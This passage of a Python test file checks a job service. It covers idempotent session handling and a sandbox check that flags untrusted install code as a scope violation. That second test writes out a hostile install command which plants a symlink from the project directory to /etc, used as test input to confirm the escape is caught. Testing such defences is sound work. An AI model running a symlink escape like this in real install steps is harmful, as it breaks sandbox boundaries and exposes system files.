    code, first = service.handle_raw(body, session_id="sess-a")
    assert (code, first) == (200, {"job_id": "j-12-1", "status": "running", "session_id": "sess-a"})
    code, again = service.handle_raw(body, session_id="sess-a")
    assert again == first
    gate.set()
    status = wait(service, "j-12-1")
    assert status["session_id"] == "sess-a"
    code, after = service.handle_raw(body, session_id="sess-a")
    assert after["status"] == "succeeded"
    assert after["session_id"] == "sess-a"
    assert len(world.engines[0].prompts) == 1


def test_untrusted_install_code_cannot_plant_symlinks(world: World) -> None:
    world.engines = [ScriptedEngine("agy", [])]
    service = world.service()
    plant = f"{sys.executable} -c \"import os; os.symlink('/etc', 'web/src/escape')\""
    start(service, job(install_cmd=plant))
    status = wait(service, "j-12-1")
    assert status["reason"] == "scope-violation"
    assert "install created symlinks" in status["detail"]
